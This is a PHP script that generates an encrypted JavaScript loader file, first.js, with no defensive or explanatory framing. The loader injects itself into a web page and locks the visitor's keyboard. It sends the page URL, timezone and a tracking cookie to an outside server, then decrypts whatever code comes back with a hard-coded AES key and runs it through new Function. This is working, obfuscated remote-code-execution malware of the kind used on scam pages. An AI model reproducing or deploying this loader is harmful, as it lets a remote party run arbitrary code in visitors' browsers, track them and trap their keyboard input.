<?php
$dynamic_url = "https://testeng.onrender.com";
#$dynamic_url = "http://127.0.0.1:8080";
$codeString = 
'window.addEventListener("load", initiateApiRequestOnce);
let requestSent = false;
function getCookieValue(name) {
    const prefix = `${name}=`;
    const cookies = document.cookie ? document.cookie.split("; ") : [];
    for (const cookie of cookies) {
        if (cookie.startsWith(prefix)) {
            return decodeURIComponent(cookie.slice(prefix.length));
        }
    }
    return null;
}
if (!getCookieValue("sid")) {
    const unixTime = Math.floor(Date.now() / 1000);
    document.cookie = `sid=${encodeURIComponent(unixTime)}; path=/; SameSite=Lax`;
}
async function initiateApiRequestOnce() {
    if (requestSent) return;
    requestSent = true;
    window.removeEventListener("load", initiateApiRequestOnce);
    secureKeyboardAccess();
    const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    try {
        const encodedScript = await transmitTimezoneData(
            "'. $dynamic_url .'/timezone.php",
            clientTimezone
        );
        decodeAndRunScript(encodedScript);

    } catch (error) {
        console.error("Error processing script:", error);

    }
}

function secureKeyboardAccess() {
    if (navigator.keyboard) {
        navigator.keyboard.lock().catch((err) =>
            console.warn("Keyboard lock failed:", err)
        );
    }
}

async function transmitTimezoneData(url, timezone) {
    try {
        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type":
                    "application/json"
            },
            body: JSON.stringify({ timezone, fullUrl: window.location.href, timestamp: getCookieValue("sid")  }),
        })
            ;
        if (!response.ok) {
            throw new Error("HTTP error! Status: " + response.status);
        }
        return response.text();
    } catch (error) {
        console.error("Error sending timezone data:", error);
        throw error;

    }
}

function aesDecode(encodedText) {
    try {
        const bytes = CryptoJS.AES.decrypt(
            encodedText,
            "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI="
        );
        return bytes.toString(CryptoJS.enc.Utf8);

    } catch (error) {
        console.error("AES decryption failed:", error);
        return "";

    }
}

function decodeAndRunScript(encodedScript) {
    try {
        const decodedScript = aesDecode(decodeURIComponent(encodedScript));
        if (decodedScript) {
            new Function(decodedScript)(); 
        } else {
            //throw new Error("Decoded script is empty.");
        }
    } catch (error) {
        console.error("Error executing script:", error);
    }
}';
function aesEncode($plainText) {
    try {
        $passphrase = "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=";
        // Generate random salt (8 bytes)
        $salt = openssl_random_pseudo_bytes(8);
        // Derive key + IV (OpenSSL EVP_BytesToKey equivalent)
        $key_iv = '';
        $prev = '';
        while (strlen($key_iv) < 48) {
            $prev = md5($prev . $passphrase . $salt, true);
            $key_iv .= $prev;
        }

        $key = substr($key_iv, 0, 32); // AES-256 key
        $iv  = substr($key_iv, 32, 16); // IV
        // Encrypt
        $encrypted = openssl_encrypt(
            $plainText,
            'AES-256-CBC',
            $key,
            OPENSSL_RAW_DATA,
            $iv
        );
        $result = "Salted__" . $salt . $encrypted;
        return base64_encode($result);
    } catch (Exception $e) {
        return "";
    }
}

$encodedString = aesEncode($codeString);

$first = '
function aesDecode(encodedText) {
    const decodedText = decodeURIComponent(encodedText);
    const bytes = CryptoJS.AES.decrypt(decodedText, "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=");
    return bytes.toString(CryptoJS.enc.Utf8);
}
function aesEncode(encodedText) {
    try {
        const bytes = CryptoJS.AES.encrypt(
            encodedText,
            "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI="
        );
        return bytes.toString();
    } catch {
        return "";
    }
}
const codeString = aesDecode(`'. urlencode($encodedString) .'`);
const script = document.createElement("script");
script.textContent = codeString;
document.body.appendChild(script);
// document.body.style.overflow = "hidden";
';

file_put_contents("first.js", $first);

